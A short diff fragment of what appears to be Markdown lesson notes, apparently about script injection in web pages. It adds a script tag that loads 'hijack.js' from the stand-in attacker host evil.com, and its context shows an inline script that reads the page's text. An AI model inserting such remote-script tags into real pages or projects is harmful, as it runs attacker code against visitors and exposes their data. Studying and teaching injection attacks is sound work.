@@ -23,6 +23,14 @@ From the repository link in the above section, did the following:
 
 ---
 
+<script src="https://evil.com:666/hijack.js"></script>
+
+---
+
+## Lesson 12
+
+---
+
 <script>
   var data = document.body.innerText;
   console.log(data);
